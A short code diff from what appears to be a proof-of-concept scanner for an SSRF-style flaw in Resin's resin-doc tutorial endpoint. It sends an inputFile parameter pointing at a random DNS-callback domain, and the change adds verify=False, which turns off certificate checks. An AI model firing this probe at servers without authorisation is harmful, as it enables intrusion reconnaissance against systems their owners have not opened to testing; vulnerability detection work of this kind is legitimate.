@@ -24,7 +24,7 @@ def poc(url):
             domain = c.getRandomDomain('resin')
             payload = '/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://%s' % domain
             target = each.rstrip('/') + payload
-            requests.get(target, timeout=5)
+            requests.get(target, timeout=5, verify=False)
             if c.verifyDNS(delay=3):
                 return each
         except Exception:
